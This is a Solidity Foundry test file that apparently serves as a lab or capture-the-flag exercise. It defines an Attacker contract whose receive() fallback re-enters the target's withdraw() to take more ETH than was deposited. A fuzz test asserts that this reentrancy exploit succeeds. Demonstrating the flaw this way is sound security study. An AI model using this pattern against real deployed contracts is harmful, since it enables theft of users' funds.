
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrance} from "../src/Reentrance.sol";

contract TestReentrancyReentrance is Test {
    
    Reentrance public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrance();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 1 gwei);
        vm.assume(attackVal < 1000 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific state required other than funding handled below.

        // --- 3. Funding ---
        // A. Fund the Victim (so it has ETH to steal)
        // We need enough for the initial withdrawal + the stolen amount
        vm.deal(address(_contractUnderTest), attackVal * 10); 
        
        // B. Fund the Attacker (redundancy)
        vm.deal(address(_attacker), attackVal * 2);

        // C. CRITICAL: Fund the Test Contract (address(this))
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    Reentrance public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = Reentrance(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedVal = val;
        
        // Deposit funds to establish a balance to withdraw
        victim.donate{value: val}(address(this));
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State.
        initialSnapshot = address(this).balance;

        // 2. Call the vulnerable function.
        victim.withdraw(val);

        // 3. Verify Success Conditions.
        // If reentrancy worked, we withdrew 'val' twice (once legitimately, once stolen).
        // Therefore, balance should increase by 2 * val.
        if (address(this).balance >= initialSnapshot + (val * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.withdraw(storedVal);
        }
    }

    fallback() external payable {}
}
